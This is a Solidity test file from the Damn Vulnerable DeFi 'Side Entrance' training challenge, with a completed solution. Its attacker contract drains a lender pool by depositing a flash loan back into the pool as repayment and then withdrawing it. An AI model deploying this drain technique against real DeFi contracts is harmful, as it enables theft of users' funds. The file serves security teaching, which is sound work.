// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;
    SideEntranceAttacker attacker;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_sideEntrance() public checkSolvedByPlayer {

        // Step 1: Deploy the attacker contract with references to the pool and recovery address
        attacker = new SideEntranceAttacker(address(pool), payable(recovery));
    
        // Step 2: Initiate the flash loan from the attacker contract
        attacker.initiateFlashLoan();
    
        // Step 3: Execute the attack to drain all ETH from the pool
        attacker.drainPool();
        
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
    }
}

// This contract exploits the SideEntranceLenderPool's vulnerability that allows 
// an attacker to deposit borrowed funds back into the pool and then withdraw them later.

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract SideEntranceAttacker is IFlashLoanEtherReceiver {

    uint256 constant FLASH_LOAN_AMOUNT = 1000 ether;  // Total ETH in the pool
    SideEntranceLenderPool public lendingPool;       // Reference to the lending pool
    address payable attackerWallet;                  // Wallet to receive stolen funds

    constructor(address poolAddress, address payable attackerWalletAddress) {
        lendingPool = SideEntranceLenderPool(poolAddress);
        attackerWallet = attackerWalletAddress;
    }

    // Step 1: Initiate a flash loan for the entire pool balance
    function initiateFlashLoan() public {
        lendingPool.flashLoan(FLASH_LOAN_AMOUNT);
    }

    // Step 2: Called during the flash loan
    // Deposit the borrowed ETH back into the pool
    function execute() external payable {
        lendingPool.deposit{value: FLASH_LOAN_AMOUNT}();
    }

    // Step 3: Withdraw all deposited ETH and transfer it to the attacker's wallet
    function drainPool() public {
        lendingPool.withdraw();
        attackerWallet.transfer(FLASH_LOAN_AMOUNT);
    }

    // Fallback function to receive ETH during withdrawal
    receive() external payable {}
}
